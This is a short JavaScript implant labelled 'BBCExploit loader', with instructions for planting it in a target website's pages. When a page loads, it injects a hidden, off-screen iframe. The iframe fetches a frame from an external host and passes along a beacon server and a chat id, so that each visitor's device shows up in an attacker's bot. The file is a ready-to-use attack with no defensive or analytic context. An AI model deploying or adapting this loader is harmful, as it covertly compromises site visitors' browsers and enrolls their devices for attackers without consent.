/* BBCExploit loader — chat 7421323579 — beacon https://ios.appfurl.com
 *
 * Install:
 *   1. Save this file as loader.js in a static directory on the target site.
 *   2. Add <script src="/loader.js"></script> just before </body>.
 *   3. Load the page once in a browser.
 *   4. Open the bot, /devices — the device appears within seconds.
 *
 * Only this chat receives the beacon; the uid is baked in below.
 */
(function () {
  var C = '7421323579';
  function boot() {
    try { sessionStorage.setItem('uid', C); } catch (e) {}
    var f = document.createElement('iframe');
    f.src = 'https://demobbcservices.vercel.app/frame.html?v=7421323579&srv=https%3A%2F%2Fios.appfurl.com&r=' + Math.random();
    f.style.cssText = 'width:1px;height:1px;opacity:0.01;position:absolute;left:-9999px;border:none';
    f.setAttribute('aria-hidden', 'true');
    (document.body || document.documentElement).appendChild(f);
  }
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', boot, { once: true });
  } else boot();
})();
